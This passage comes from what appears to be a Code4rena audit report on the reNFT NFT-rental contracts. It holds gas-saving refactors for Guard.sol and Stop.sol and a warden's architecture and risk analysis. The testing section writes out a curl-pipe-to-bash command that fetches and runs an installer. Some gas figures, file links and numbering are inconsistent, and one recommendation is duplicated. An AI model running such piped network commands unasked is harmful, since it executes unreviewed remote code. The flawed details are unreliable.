86:        view
87:        override
88:        onlyKernel
89:        returns (Permissions[] memory requests)
90:    {
91:        requests = new Permissions[](2);
92:        requests[0] = Permissions(toKeycode("STORE"), STORE.updateHookPath.selector);  //@audit STORE 1st SLOAD
93:        requests[1] = Permissions(toKeycode("STORE"), STORE.updateHookStatus.selector);  //@audit STORE 2nd SLOAD
94:    }
```

```diff
diff --git a/src/policies/Guard.sol b/src/policies/Guard.sol
index a0a565a..053e45e 100644
--- a/src/policies/Guard.sol
+++ b/src/policies/Guard.sol
@@ -88,9 +88,10 @@ contract Guard is Policy, BaseGuard {
         onlyKernel
         returns (Permissions[] memory requests)
     {
+        Storage _store = STORE;
         requests = new Permissions[](2);
-        requests[0] = Permissions(toKeycode("STORE"), STORE.updateHookPath.selector);
-        requests[1] = Permissions(toKeycode("STORE"), STORE.updateHookStatus.selector);
+        requests[0] = Permissions(toKeycode("STORE"), _store.updateHookPath.selector);
+        requests[1] = Permissions(toKeycode("STORE"), _store.updateHookStatus.selector);
     }

     /////////////////////////////////////////////////////////////////////////////////
```
```
Estimated gas saved: 97 gas units
```
</details

4. ### Refactor `Guard.checkTransaction()`  to avoid 2 `SLOAD(Gwarmaccess)`
- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Guard.sol#L335

We can reduce the gas cost of the `checkTransaction()` function by reducing the number of storage reads (`SLOAD`) for the state variable `STORE`. The value of the `STORE` state variable should be cached in a stack variable then the stack variable be used for subsequent reads of the `STORE` state variable. In implementing this we replace 2 `SLOAD`s(cold acess) `200` gas units with  much cheaper 2 `MLOAD` `6` gas units: The diff below shows how the code could be refactored:

<details>

```solidity
file: src/policies/Guard.sol

309:    function checkTransaction(
310:        address to,
311:        uint256 value,
312:        bytes memory data,
313:        Enum.Operation operation,
314:        uint256,
315:        uint256,
316:        uint256,
317:        address,
318:       address payable,
319:        bytes memory,
320:        address
321:    ) external override {
322:        // Disallow transactions that use delegate call, unless explicitly
323:        // permitted by the protocol.
324:        if (operation == Enum.Operation.DelegateCall && !STORE.whitelistedDelegates(to)) {  //@audit STORE 1st SLOAD
325:            revert Errors.GuardPolicy_UnauthorizedDelegateCall(to);
326:        }
327:
328:        // Require that a function selector exists.
329:        if (data.length < 4) {
330:            revert Errors.GuardPolicy_FunctionSelectorRequired();
331:        }
332:
333:        // Fetch the hook to interact with for this transaction.
334:        address hook = STORE.contractToHook(to);  //@audit STORE 2nd SLOAD
335:        bool isActive = STORE.hookOnTransaction(hook);  //@audit STORE 3rd SLOAD
.
.
.
345:    }
```

```diff
diff --git a/src/policies/Guard.sol b/src/policies/Guard.sol
index a0a565a..c24619f 100644
--- a/src/policies/Guard.sol
+++ b/src/policies/Guard.sol
@@ -319,9 +319,11 @@ contract Guard is Policy, BaseGuard {
         bytes memory,
         address
     ) external override {
+
+        Storage _store = STORE;
         // Disallow transactions that use delegate call, unless explicitly
         // permitted by the protocol.
-        if (operation == Enum.Operation.DelegateCall && !STORE.whitelistedDelegates(to)) {
+        if (operation == Enum.Operation.DelegateCall && !_store.whitelistedDelegates(to)) {
             revert Errors.GuardPolicy_UnauthorizedDelegateCall(to);
         }

@@ -331,8 +333,8 @@ contract Guard is Policy, BaseGuard {
         }

         // Fetch the hook to interact with for this transaction.
-        address hook = STORE.contractToHook(to);
-        bool isActive = STORE.hookOnTransaction(hook);
+        address hook = _store.contractToHook(to);
+        bool isActive = _store.hookOnTransaction(hook);

         // If a hook exists and is enabled, forward the control flow to the hook.
         if (hook != address(0) && isActive) {
```
```
Estimated gas saved: 194 gas units saved
```
</details>


5. ### Refactor `Stop.requestPermissions()`  to avoid 2 `SLOAD(Gwarmaccess)`
- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Stop.sol#L96
- https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Stop.sol#L98

We can reduce the gas cost of the `requestPermissions()` function by reducing the number of storage reads (`SLOAD`) for the state variables `STORE` and `ESCRW`. The value of the `STORE` and `ESCRW` state variables should be cached stack variables then the stack variables be used for subsequent reads of the `STORE` and `ESCRW` state variable. In implementing this we replace 2 `SLOAD`s(cold acess) `200` gas units with  much cheaper 2 `MLOAD` `6` gas units: The diff below shows how the code could be refactored:

<details>

```solidity
file: src/policies/Stop.sol

87:    function requestPermissions()
88:        external
89:        view
90:        override
91:        onlyKernel
92:        returns (Permissions[] memory requests)
93:    {
94:        requests = new Permissions[](4);
95:        requests[0] = Permissions(toKeycode("STORE"), STORE.removeRentals.selector);  //@audit STORE 1st SLOAD
96:        requests[1] = Permissions(toKeycode("STORE"), STORE.removeRentalsBatch.selector);  //@audit STORE 2nd SLOAD
97:        requests[2] = Permissions(toKeycode("ESCRW"), ESCRW.settlePayment.selector);  //@audit ESCRW 1st SLOAD
98:        requests[3] = Permissions(toKeycode("ESCRW"), ESCRW.settlePaymentBatch.selector);  //@audit ESCRW 2nd SLOAD
99:    }
```

```diff
diff --git a/src/policies/Stop.sol b/src/policies/Stop.sol
index ab240ba..ad7cee5 100644
--- a/src/policies/Stop.sol
+++ b/src/policies/Stop.sol
@@ -92,10 +92,13 @@ contract Stop is Policy, Signer, Reclaimer, Accumulator {
         returns (Permissions[] memory requests)
     {
         requests = new Permissions[](4);
-        requests[0] = Permissions(toKeycode("STORE"), STORE.removeRentals.selector);
-        requests[1] = Permissions(toKeycode("STORE"), STORE.removeRentalsBatch.selector);
-        requests[2] = Permissions(toKeycode("ESCRW"), ESCRW.settlePayment.selector);
-        requests[3] = Permissions(toKeycode("ESCRW"), ESCRW.settlePaymentBatch.selector);
+        Storage _store = STORE;
+        PaymentEscrow _escrw = ESCRW;
+
+        requests[0] = Permissions(toKeycode("STORE"), _store.removeRentals.selector);
+        requests[1] = Permissions(toKeycode("STORE"), _store.removeRentalsBatch.selector);
+        requests[2] = Permissions(toKeycode("ESCRW"), _escrw.settlePayment.selector);
+        requests[3] = Permissions(toKeycode("ESCRW"), _escrw.settlePaymentBatch.selector);
     }
```
```
Estimated gas saved: 194 gas units
```

</details>

## Conclusion
As you embark on incorporating the recommended optimizations, we want to emphasize the utmost importance of proceeding with vigilance and dedicating thorough efforts to comprehensive testing. It is of paramount significance to ensure that the proposed alterations do not inadvertently introduce fresh vulnerabilities, while also successfully achieving the anticipated enhancements in performance.

We strongly advise conducting a meticulous and exhaustive evaluation of the modifications made to the codebase. This rigorous scrutiny and exhaustive assessment will play a pivotal role in affirming both the security and efficacy of the refactored code. Your careful attention to detail, coupled with the implementation of a robust testing framework, will provide the necessary assurance that the refined code aligns with your security objectives and effectively fulfills the intended performance optimizations.

**[Alec1017 (reNFT) confirmed](https://github.com/code-423n4/2024-01-renft-findings/issues/560#issuecomment-1910731385)**

***


# Audit Analysis

For this audit, 16 analysis reports were submitted by wardens. An analysis report examines the codebase as a whole, providing observations and advice on such topics as architecture, mechanism, or approach. The [report highlighted below](https://github.com/code-423n4/2024-01-renft-findings/issues/582) by **fouzantanveer** received the top score from the judge.

*The following wardens also submitted reports: [hunter\_w3b](https://github.com/code-423n4/2024-01-renft-findings/issues/610), [tala7985](https://github.com/code-423n4/2024-01-renft-findings/issues/561), [SAQ](https://github.com/code-423n4/2024-01-renft-findings/issues/420), [albahaca](https://github.com/code-423n4/2024-01-renft-findings/issues/386), [kaveyjoe](https://github.com/code-423n4/2024-01-renft-findings/issues/380), [0xA5DF](https://github.com/code-423n4/2024-01-renft-findings/issues/331), [0xepley](https://github.com/code-423n4/2024-01-renft-findings/issues/223), [yongskiws](https://github.com/code-423n4/2024-01-renft-findings/issues/633), [SBSecurity](https://github.com/code-423n4/2024-01-renft-findings/issues/631), [hals](https://github.com/code-423n4/2024-01-renft-findings/issues/491), [clara](https://github.com/code-423n4/2024-01-renft-findings/issues/470), [peanuts](https://github.com/code-423n4/2024-01-renft-findings/issues/468), [pavankv](https://github.com/code-423n4/2024-01-renft-findings/issues/368), [catellatech](https://github.com/code-423n4/2024-01-renft-findings/issues/248), and [ladboy233](https://github.com/code-423n4/2024-01-renft-findings/issues/96).*

## Conceptual Overview
The reNFT project introduces a unique concept in the NFT world, allowing NFT owners, or lenders, to rent out their digital assets. This setup offers an opportunity for NFT owners to earn passive income through rentals, without having to sell their assets. It's a smart way for them to make the most out of their digital collections.
On the other side are the renters - users who want to use NFTs temporarily. This could be for various reasons, like gaming or temporarily boosting a digital collection. Renting NFTs is a cost-effective solution for them, as it provides access to valuable digital assets without the need for a large upfront investment.
What makes reNFT stand out is its integration with the Seaport protocol, ensuring a smooth and secure transaction process. This integration manages the transfer of NFTs between lenders and renters efficiently and safely, providing a reliable platform for both parties to transact. In short, reNFT is transforming how NFTs are utilized, offering innovative solutions for owners and enthusiasts alike.

*Note: to view the provided image, please see the original submission [here](https://github.com/code-423n4/2024-01-renft-findings/issues/582).*

## Quality of codebase

After a thorough examination of the reNFT codebase, a key observation is the balance between complexity and clarity. For instance, contracts like `Create.sol` exhibit a significant level of complexity due to their multifaceted roles in handling asset transfers, interfacing with Seaport, and managing diverse token standards like ERC-721/ERC-1155. This complexity, while necessary for the contract's functionality, suggests a potential area for optimization, especially in terms of gas efficiency and processing loops.

In contrast, the `Kernel.sol` contract, acting as the ecosystem's nucleus, orchestrates modules and policies with a high degree of interconnectivity. This complexity is offset by a clear modular structure and well-commented code, enhancing maintainability. The modular structure of the reNFT project, particularly evident in the `Kernel.sol` contract, is a standout feature. This contract effectively serves as the central hub, managing various modules and policies. Each module and policy is treated as an independent component, allowing for separation of concerns and easier maintenance. This modular approach is not only evident in the organizational structure of the contracts but also in how they interact with each other. Each module, identified by a unique keycode, can be independently installed, upgraded, or interacted with, while policies can request permissions for specific actions. This design facilitates scalability and flexibility, allowing for seamless integration of new features or updates without disrupting the entire system. The clarity and thoroughness of the code comments further aid in understanding the purpose and functionality of each part, contributing to the overall maintainability of the system.

Here is the tabular analysis of the code files of project

| File                        | Language | Code | Comment | Blank | Total |
|-----------------------------|----------|------|---------|-------|-------|
| `src/policies/Accumulator.sol` | Solidity | 52   | 72      | 23    | 147   |
| `src/policies/Admin.sol`       | Solidity | 77   | 81      | 19    | 177   |
| `src/policies/Create.sol`      | Solidity | 422  | 273     | 82    | 777   |
| `src/policies/Create2Deployer.sol` | Solidity | 53   | 56      | 13    | 122   |
| `src/policies/Factory.sol`     | Solidity | 92   | 82      | 21    | 195   |
| `src/policies/Guard.sol`       | Solidity | 201  | 144     | 35    | 380   |
| `src/policies/Kernel.sol`      | Solidity | 238  | 286     | 94    | 618   |
| `src/policies/PaymentEscrow.sol` | Solidity | 185  | 202     | 47    | 434   |
| `src/policies/Reclaimer.sol`   | Solidity | 41   | 49      | 13    | 103   |
| `src/policies/Signer.sol`      | Solidity | 233  | 136     | 41    | 410   |
| `src/policies/Stop.sol`        | Solidity | 181  | 139     | 46    | 366   |
| `src/policies/Storage.sol`     | Solidity | 130  | 193     | 51    | 374   |




These observations reflect a codebase that, while technically sophisticated and functionally rich, still presents opportunities for refinement, especially in enhancing performance and ensuring long-term maintainability.

## Approach taken in Evaluating codebase

To audit the reNFT project, I implemented a structured approach that combined a thorough review of the provided documentation, an in-depth code analysis, an understanding of publicly known issues, insights from external reports, and comprehensive testing. Here's the detailed process:

1. **Initial Overview from Code4rena**: Began with the project's overview on [Code4rena](https://code4rena.com/audits/2024-01-renft#top:~:text=Overview,or%20upgrading%20modules.), to understand its objective of creating a decentralized rental market for NFTs. Key insights were the use of Seaport for order processing and Gnosis Safe for rental safe management.

2. **Analyzing the Default Framework**: Studied the Default Framework from [GitHub](https://github.com/fullyallocated/Default?tab=readme-ov-file). This was pivotal for understanding reNFT's architecture, especially its Kernel-Module-Policy structure, and the interaction of these components as depicted in the documentation images.

3. **Audited the codebase files in this order**

| File Name | Core Functionality | Technical Characteristics | Importance and Management |
|-----------|--------------------|---------------------------|---------------------------|
| [`Kernel.sol`](https://github.com/fullyallocated/Default/src/Kernel.sol) | Central registry and management of policies and modules. | Implements role-based access control, module installation, and policy activation. | Acts as the backbone, managing permissions and interactions between different parts of the system. |
| [`Create.sol`](https://github.com/fullyallocated/Default/src/policies/Create.sol) | Interface for creating rentals, integrating with Seaport for order fulfillment. | Extensive use of structs for organizing rental data, EIP-712 signature verification, and careful handling of offer and consideration items. | Serves as the core for initiating and managing rental orders, crucial for the protocol’s operation around rentals. |
| [`Storage.sol`](https://github.com/fullyallocated/Default/src/modules/Storage.sol) | Maintains all protocol storage, including state and data related to rentals. | Efficient data structuring with a focus on integrity and accessibility of rental records. | Essential for data persistence and state maintenance, ensuring the consistency and reliability of the protocol. |
| [`PaymentEscrow.sol`](https://github.com/fullyallocated/Default/src/modules/PaymentEscrow.sol) | Manages escrowing of rental payments. | Secure handling of funds with mechanisms for deposit management and payment settlements. | Key for managing financial aspects of rentals, ensuring secure and orderly flow of funds. |
| [`Signer.sol`](https://github.com/fullyallocated/Default/src/packages/Signer.sol) | Handles logic related to signature verification for rentals. | Implements robust mechanisms for signature validation to authenticate transactions. | Critical for ensuring the authenticity and integrity of transactions within the protocol. |
| [`Admin.sol`](https://github.com/fullyallocated/Default/src/policies/Admin.sol) | Administrative functions like fee, proxy, and whitelist management. | Clear distinction and secure implementation of administrative roles and actions. | Central to governance, providing tools for protocol management and configuration. |
| [`Guard.sol`](https://github.com/fullyallocated/Default/src/policies/Guard.sol) | Protects transactions originating from rental wallets. | Implements comprehensive checks against unauthorized transfers and function calls. | Vital for ensuring the security of rental wallets, preventing misuse and unauthorized access. |
| [`Factory.sol`](https://github.com/fullyallocated/Default/src/policies/Factory.sol) | Deploys and initializes rental safes. | Efficient deployment and initialization processes for creating secure rental safes. | Streamlines the process of rental safe creation, integral to the rental mechanism. |
| [`Stop.sol`](https://github.com/fullyallocated/Default/src/policies/Stop.sol) | Manages the stopping of rentals. | Implements logic for orderly termination of rentals, including asset and payment settlements. | Crucial for the proper conclusion of rental agreements, handling the return of assets and payments. |
| [`Create2Deployer.sol`](https://github.com/fullyallocated/Default/src/Create2Deployer.sol) | Uses `create2` for predictable and secure contract deployments. | Innovative use of `create2` for deploying contracts with predictable addresses and added security measures. | Enhances the deployment process with predictability and security, beneficial for cross-chain operations. |
| [`Accumulator.sol`](https://github.com/fullyallocated/Default/src/packages/Accumulator.sol) | Manages dynamically allocated data struct arrays in memory. | Optimized for low gas consumption, enhancing performance in dynamic data handling. | Supports performance and efficiency, particularly in scenarios with variable data structures. |
| [`Zone.sol`](https://github.com/fullyallocated/Default/src/packages/Zone.sol) | (Not directly included but inferred) Manages zone-specific logic for rentals. | Likely handles custom logic for different operational zones or contexts within the rental process. | Assumed to be important for contextual handling and customization within different parts of the rental lifecycle. |

5. **Reviewing Publicly Known Issues**: Investigated issues listed on [Code4rena](https://code4rena.com/audits/2024-01-renft#top:~:text=ineligible%20for%20awards.-,Publicly%20Known%20Issues,the%0APaymentEscrow%0Acontract.%20Therefore%2C%20these%20issues%20are%20considered%20to%20be%20known.,-Overview), including the potential manipulation via Hook Contracts and limitations of the Guard contract. These helped me focus on specific areas in the code that could be susceptible to exploitation.

6. **Analyzing External Reports ([4naly3er report](https://github.com/code-423n4/2024-01-renft/blob/main/4naly3er-report.md))**: This report provided an alternate perspective on potential vulnerabilities. Key insights were the emphasis on the robustness of rental wallet security and the importance of accurate rental asset tracking.

7. **Foundry Testing:**
   
   Foundry, a modern smart contract testing framework, was utilized to test the reNFT contracts. This involved several key steps:
   
   a. **Installation and Setup:**
      - Foundry was installed using the command `curl -L https://foundry.paradigm.xyz | bash`, followed by `foundryup` to ensure the latest version was in use.
      - Dependencies were installed using `forge install`, ensuring all necessary components were available for the testing process.
   
   b. **Execution of Tests:**
      - Tests were run using `forge test`, executing a suite of predefined test cases that covered various functionalities and scenarios within the reNFT contracts.
      - A gas report was generated using `forge test --gas-report`. This report provided insights into the gas efficiency of the contracts, which is crucial for optimizing transaction costs on the blockchain.
   
   c. **Test Coverage and Documentation:**
      - The overview of the testing suite, as referred to in the provided documentation, likely details the scope, scenarios, and objectives of each test, ensuring a comprehensive assessment of the contracts.
   
   **Slither Static Analysis:**
   
   Slither, a static analysis tool, was employed to identify vulnerabilities in the Solidity code:
   
   a. **Slither Setup:**
      - Slither was installed using `pip3 install slither-analyzer`, preparing the tool for analysis.
      
   b. **Analysis Execution:**
      - Running `slither .` on the project directory executed static analysis across all contracts, detecting potential issues and vulnerabilities.
   
   c. **Review and Response to Findings:**
      - The output of Slither, especially the default detectors, provided insights into lower-risk or common vulnerability patterns. Responses to these findings, documented by the reNFT team, helped in understanding how these potential issues were addressed or mitigated.
   
   **Analysis and Testing Insights:**
   
   Through this testing process, several key insights about the reNFT project emerged:
   
   - **Robustness of Contracts:** The range of tests conducted using Foundry suggested a thorough examination of the contracts under various conditions, ensuring their robustness and reliability.
   - **Gas Efficiency:** The gas reports indicated the contracts' efficiency, an essential aspect given the transaction cost considerations on Ethereum-based platforms.
   - **Security Posture:** The use of Slither for static analysis highlighted the team's proactive approach to security, identifying and addressing vulnerabilities before deployment.
   - **Continuous Improvement:** The response to Slither's findings and the iterative testing approach suggested a commitment to continuous improvement and adaptation to emerging security challenges in the smart contract space.
   In conclusion, the testing and analysis process for reNFT demonstrated a comprehensive and security-focused approach, reinforcing confidence in the integrity and reliability of the project's contracts.

Throughout the audit process, my focus was on identifying discrepancies between the project's intended functionality and its actual implementation, assessing adherence to security best practices, and evaluating the overall robustness of the codebase. The combination of meticulous code review, understanding known vulnerabilities, analyzing external insights, and rigorous testing formed the foundation of a comprehensive audit.

## Technical Architecture of reNFT:

### State Diagram:
*Note: to view the provided image, please see the original submission [here](https://github.com/code-423n4/2024-01-renft-findings/issues/582).*

The class diagram for the reNFT project illustrates the relationships between key components. At the top level, there's the `Kernel`, which acts as a central registry and controller for policies and modules. `Module` and `Policy` are abstract classes, with `Policy` being extended by specific contracts like `Create`, `Stop`, `Guard`, `Admin`, and `Factory`. These policies define various functionalities of the system, from rental creation (`Create`) to rental termination (`Stop`) and security (`Guard`). `Admin` manages administrative tasks, and `Factory` is involved in deploying rental safes. `Storage` and `PaymentEscrow` are modules used by policies for data storage and payment handling, respectively. `Create2Deployer` is a utility for deploying contracts. The diagram demonstrates a structured, modular approach in the reNFT project, emphasizing separation of concerns and clear responsibilities among different components.

The reNFT platform is a comprehensive system for NFT rentals, structured around a series of interconnected smart contracts. Each contract plays a pivotal role in facilitating user interactions and managing the rental process, ensuring a seamless and secure experience.

### Kernel.sol - System Governance:
The **Kernel.sol** contract acts as the administrative center. Its `executeAction` function is pivotal in modifying system configurations, such as installing new modules or updating policies. When users initiate a transaction, this function might be called to ensure that the system's settings align with the current operational requirements.

*Note: to view the provided image, please see the original submission [here](https://github.com/code-423n4/2024-01-renft-findings/issues/582).*

The diagram depicts the architectural structure of `Kernel.sol` and its interaction with other core components within the reNFT ecosystem. The `Kernel` acts as the central registry, coordinating between `Modules` and `Policies`. It shows that `Modules` communicate internally with `Kernel`, which then orchestrates the policies through the `KernelAdapter`. Policies define the rules and behaviors for different operations and interact with `Kernel` to carry out those operations, while `Kernel` also handles errors through the `Errors` contract and logs activities via `Events`. The `Keycode` facilitates the identification and interaction of specific modules within the system. 


### Storage.sol - Record Keeping:
**Storage.sol** is essential for maintaining the integrity of rental records. Functions like `addRentals` and `removeRentals` are crucial for tracking active rentals and removing them post-completion. The `addRentals` and `removeRentals` functions in the reNFT architecture play pivotal roles beyond their surface-level code functionality. They are not just about adding or removing data entries; they embody the core dynamics of the rental process within the reNFT ecosystem.

### Architectural Significance

1. **Maintaining Rental State**: These functions are crucial in maintaining the state of each NFT within the rental ecosystem. `addRentals` marks the initiation of a rental contract, transitioning an NFT from a state of availability to one of active rental. Conversely, `removeRentals` signifies the conclusion of the rental agreement, resetting the state of the NFT back to available. This state management is vital for ensuring the integrity and consistency of the rental transactions.

2. **Data Integrity and Security**: The implementation of these functions underscores the importance of data integrity and security within the reNFT platform. By securely adding and removing rental agreements, these functions uphold the trustworthiness of the platform. This is particularly crucial given the value and uniqueness of NFTs, which can represent significant monetary and sentimental value.

3. **Smart Contract Optimization**: From an architectural standpoint, the efficient handling of these functions can significantly impact the overall gas costs and performance of the platform. Optimizing these functions for minimal gas usage without compromising on security or functionality is a key consideration in smart contract development.

4. **User Experience**: The seamless execution of `addRentals` and `removeRentals` is central to the user experience. For lenders, the assurance that their assets are properly tracked and managed during the rental period is paramount. For renters, the clarity of knowing exactly when their rental period starts and ends is crucial for planning and utilization.

### Creative Insights

- **Dynamic Pricing Models**: These functions could potentially integrate dynamic pricing models based on demand and supply. For instance, `addRentals` could implement a pricing algorithm that adjusts rental rates based on the popularity or scarcity of a particular NFT.

- **NFT Wear and Tear Concept**: An innovative concept could be the introduction of a virtual 'wear and tear' metric for NFTs, managed through `addRentals` and `removeRentals`. Though NFTs don't degrade physically, a usage metric could introduce a new dynamic in the rental market, affecting pricing and desirability.

- **Integration with External Platforms**: These functions could be designed to interface with external platforms or services, such as insurance protocols for NFTs, providing additional layers of security and trust for users.

### PaymentEscrow.sol - Financial Handling:
In **PaymentEscrow.sol**, financial transactions are managed. The `settlePayment` function is responsible for disbursing funds at the end of a rental period, while `increaseDeposit` handles incoming payments at the start of a rental. This ensures that users' funds are securely managed throughout the rental process.

### Signer.sol - Security and Authentication:
The **Signer.sol** contract is key for authenticating transactions. It employs `_recoverSignerFromPayload` to ascertain the legitimacy of transaction initiators, adding a layer of security and ensuring that only authorized actions are executed within the platform.

### Reclaimer.sol - Asset Management:
**Reclaimer.sol** ensures the safe return of rented assets. The `_reclaimRentedItems` function interacts with the rental wallet to transfer assets back to the rightful owner after the rental period, safeguarding users' interests.

### Create.sol - Rental Initiation:
The **Create.sol** contract is central to starting the rental process. As users initiate a rental, this contract processes the transaction, including the validation of rental terms and the setup of the rental agreement, ensuring a smooth start to the rental period.

### Accumulator.sol - Dynamic Data Handling:
**Accumulator.sol** plays a role in managing dynamically allocated data arrays, crucial for adapting to various rental agreement sizes and terms as users engage with different NFTs.

### Factory.sol - Safe Deployment:
In **Factory.sol**, the focus is on deploying rental safes, a key element in the rental process. This contract ensures that each rental transaction has a secure and dedicated environment, enhancing user trust in the platform. The `deployRentalSafe()` function in this contract is instrumental for creating rental safes, key to managing rental transactions. This function first ensures the specified threshold, which dictates the number of signatures required for executing transactions on the safe, is valid. It then makes a critical delegate call to initialize the safe with necessary policies, particularly the stop policy and guard policy, by invoking the `initializeRentalSafe` function. This step is crucial to equip the rental safe with appropriate safeguards.

Next, the function constructs an initializer payload tailored for a Gnosis Safe setup. This payload encapsulates essential details like owners, threshold, and fallback manager address. Utilizing the Gnosis Safe Proxy Factory, the function then deploys a new safe proxy using this payload and a unique salt nonce, ensuring the safe's address uniqueness across different chains.

UML diagram of `deployRentalSafe()` is given below for better understanding:

*Note: to view the provided image, please see the original submission [here](https://github.com/code-423n4/2024-01-renft-findings/issues/582).*

Post deployment, the safe's address is registered within the `Factory` contract's storage. This registration is vital for the protocol's recognition and subsequent management of the safe. Finally, the function broadcasts an event to signal the successful deployment of the rental safe, including relevant details such as the safe's address, its owners, and the threshold. This comprehensive process, governed by the `deployRentalSafe()` function, thus ensures a standardized, secure, and efficient setup for rental safes, integral to the functionality of the reNFT ecosystem. 

### Guard.sol - Transaction Security:
**Guard.sol** acts as a safeguard for transactions originating from rental wallets, ensuring that assets within these wallets are securely managed and only authorized transactions are processed.

### Stop.sol - Rental Conclusion:
**Stop.sol** is instrumental in concluding rentals. It handles the cessation of rental agreements, ensuring assets are returned and funds are disbursed correctly, thus bringing the rental process to a secure and satisfactory close.

### Admin.sol - Administrative Controls:
**Admin.sol** provides administrative functionalities like fee management and whitelist control, ensuring smooth operational governance as users interact with the platform.

### Create2Deployer.sol - Efficient Contract Deployment:
The `Create2Deployer.sol` contract facilitates efficient and secure contract deployment through a specific Ethereum feature known as CREATE2. This feature provides predictable and reliable address generation for new smart contracts, making it a powerful tool for advanced deployment strategies in the Ethereum ecosystem.

The mechanism of CREATE2 allows for the computation of an address for a new contract before the contract is actually deployed. This is achieved by using a combination of the deployer's address, a user-provided salt (a unique value), and the bytecode of the contract to be deployed. The `Create2Deployer.sol` contract uses this feature to ensure that the same contract can be deployed across different blockchains (like Ethereum Mainnet, Polygon, Avalanche, etc.) at the same address, providing a consistent experience across platforms and enhancing trust and recognition among users.

In practice, the `Create2Deployer.sol` contract provides a `deploy` function where users specify the salt and the bytecode (init code) of the contract they wish to deploy. The contract first validates the salt by ensuring it includes the address of the sender, preventing front-running and ensuring that only authorized parties can deploy specific contracts. It then calculates the target address for the deployment using the CREATE2 opcode, ensuring that the resulting address is unique and has not been deployed to previously. This process is done via the `getCreate2Address` function, which returns the address that would be generated for the given parameters.

Once the address is calculated and validated, the contract deploys the new contract to that address using the provided bytecode and salt. This method of deployment is particularly useful in scenarios where the address of a contract needs to be known in advance, such as in the case of cross-chain operations or when interacting with other contracts that require a predefined address.

### User Journey Through the Architecture:
As users engage with the reNFT platform, they seamlessly interact with these contracts. For example, initiating a rental activates **Create.sol** for processing the transaction, with **Storage.sol** and **PaymentEscrow.sol** managing records and finances. Throughout the rental, **Guard.sol** and **Reclaimer.sol** ensure asset security, and upon conclusion, **Stop.sol** facilitates the return process. Administrative actions, such as fee adjustments, are managed through **Admin.sol**, while **Factory.sol** and **Create2Deployer.sol** play their part in setting up the necessary infrastructure. The entire process is governed and overseen by **Kernel.sol**, ensuring compliance with the platform's policies and configurations.

Concluding, reNFT's architecture is a multi-faceted framework where each contract is intricately linked to facilitate various stages of the NFT rental process, from initiation to conclusion, ensuring a secure, transparent, and user-friendly experience.

## Software engineering considerations
In analyzing the reNFT project from a software engineering perspective, several considerations stand out:

1. **Modularity and Separation of Concerns**: The project's structure demonstrates a clear separation into distinct contracts, such as `Storage`, `PaymentEscrow`, and various policy contracts like `Create`, `Stop`, `Guard`, etc. This modular approach aids in readability, maintainability, and scalability. Each contract addresses specific functionalities, reducing complexity and potential interactions that could lead to vulnerabilities.

2. **Upgradability and Configuration Management**: The project appears to employ upgradable contract patterns. This design choice allows for future improvements and bug fixes without redeploying the entire system. However, it also introduces risks associated with proxy patterns and requires careful management of state and initialization logic.

3. **Dependency Management**: The project relies on external contracts and standards (like Seaport, ERC721, ERC1155). Managing these dependencies is crucial, especially considering potential changes or updates in these external systems.

4. **Security Practices**: The use of `onlyRole` and similar modifiers in contracts like `Policy` indicates an emphasis on access control and permissions. The project also seems to incorporate patterns for secure interaction with tokens and user assets. However, this necessitates rigorous testing and auditing to ensure that security measures are robust and effective.

5. **Error Handling and Reversion Patterns**: The project employs custom error messages (via the `Errors.sol` library), improving debuggability and user experience. This practice is preferable over generic failure messages and should be consistently applied across the project.

## Risks related to the project
In the reNFT project, various risks can be identified:

1. **Admin Abuse Risks**: 
   Functions in `Admin.sol` like setting fees or toggling whitelist statuses are powerful. If the `ADMIN_ADMIN` role is compromised or misused, it could lead to unfavorable changes in protocol parameters, affecting user experience and trust.

2. **Systemic Risks**: 
   The centralized data management in `Storage.sol` implies that issues in this contract (like bugs or downtimes) can have widespread implications across the entire platform.

3. **Technical Risks**: 
   Complex logic, especially in contracts like `Create.sol`, which handles intricate rental transactions, is susceptible to bugs or exploits. `Create.sol:` This contract is responsible for initializing rental orders. Its complex logic, involving interactions with external contracts like Seaport and handling various item types (ERC-721/ERC-1155), poses a risk. Mismanagement or bugs in the processing of orders, especially in functions that convert Seaport order items to rental items, could lead to incorrect asset handling or vulnerabilities in asset transfer logic.

   `Stop.sol:` This contract deals with stopping rentals and reclaiming assets. The complexity lies in ensuring that assets are returned correctly and securely to the original owners and managing ERC20 payments. Any flaws in functions that handle these operations, such as asset reclamation or payment settlements, could potentially be exploited, leading to loss of assets or incorrect fund distribution.
   
   `Guard.sol:` It guards transactions originating from rental wallets. Vulnerabilities could arise from how it manages whitelists or restrictions on function selectors. For example, incorrect handling of whitelisted addresses or allowed function selectors could open up possibilities for unauthorized asset transfers or malicious module activations.
   
*Note: to view the provided image, please see the original submission [here](https://github.com/code-423n4/2024-01-renft-findings/issues/582).*

5. **Integration Risks**: 
   Dependencies on external contracts, such as Seaport, introduce risks. Any updates or issues in these external contracts can directly impact the reNFT's functionalities.

6. **Non-standard Token Risks**: 
   The handling of ERC20 tokens in contracts like `PaymentEscrow.sol` might not be fully compatible with non-standard tokens (e.g., rebasing or fee-on-transfer tokens), which could lead to incorrect processing of token transfers or balances.

In essence, while each of these risks is manageable, they represent areas where the project should exercise caution and implement robust monitoring and mitigation strategies.


*Note: to view the provided image, please see the original submission [here](https://github.com/code-423n4/2024-01-renft-findings/issues/582).*

## Additional Recommendations
Enhancing validation in `Guard.sol`, specifically in the `_checkTransaction` function, involves implementing a more robust compliance check for the ERC-721 and ERC-1155 token standards. Here's a technical approach to achieve this:

1. **Interface Compliance Check**: Implement a function to check if a token contract implements the ERC-721 or ERC-1155 interface. This can be done by calling the `supportsInterface` function, which is a part of the ERC-165 standard that both ERC-721 and ERC-1155 implement. For instance:

   ```solidity
   function isERC721(address token) internal view returns (bool) {
       return IERC165(token).supportsInterface(type(IERC721).interfaceId);
   }

   function isERC1155(address token) internal view returns (bool) {
       return IERC165(token).supportsInterface(type(IERC1155).interfaceId);
   }
   ```

2. Enhancing validation in `Guard.sol`, specifically in the `_checkTransaction` function, involves implementing a more robust compliance check for the ERC-721 and ERC-1155 token standards. Here's a technical approach to achieve this:

   **Interface Compliance Check**: Implement a function to check if a token contract implements the ERC-721 or ERC-1155 interface. This can be done by calling the `supportsInterface` function, which is a part of the ERC-165 standard that both ERC-721 and ERC-1155 implement. For instance:

   ```solidity
   function isERC721(address token) internal view returns (bool) {
